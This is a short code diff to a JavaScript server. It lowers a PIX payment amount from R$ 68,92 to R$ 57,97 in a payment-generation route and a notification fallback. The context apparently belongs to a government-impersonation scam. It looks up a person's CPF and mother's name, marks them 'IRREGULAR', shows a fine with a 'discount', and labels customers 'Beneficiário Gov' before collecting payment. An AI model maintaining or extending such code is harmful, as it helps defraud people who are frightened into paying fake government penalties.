@@ -476,15 +476,15 @@ async function fetchCpfData(rawCpf) {
       mae: externalData?.mae || '',
       status: 'IRREGULAR',
       multa: 419.55,
-      desconto: 68.92
+      desconto: 57.97
     }));
     return;
   }
 
-  // 2. Generate PIX (Main Attendance / Chat - R$ 68,92)
+  // 2. Generate PIX (Main Attendance / Chat - R$ 57,97)
   if (pathname === '/generate-pix' && method === 'POST') {
     const clientData = await readJsonBody();
-    const amount = 68.92;
+    const amount = 57.97;
     adminService.recordSessionEvent('identidade');
 
     const result = await createUniversalTransaction({
@@ -795,7 +795,7 @@ async function fetchCpfData(rawCpf) {
     const notifyPaymentPaid = (gwId, sourceTx) => {
       adminService.updateOrderStatus(gwId, 'PAID');
       const orderObj = adminService.getOrderById(gwId)?.order || sourceTx;
-      const amt = orderObj?.amount || sourceTx?.amount || 68.92;
+      const amt = orderObj?.amount || sourceTx?.amount || 57.97;
       const cust = {
         name: orderObj?.clientName || sourceTx?.name || 'Beneficiário Gov',
         email: orderObj?.email || sourceTx?.email || 'cliente@email.com',
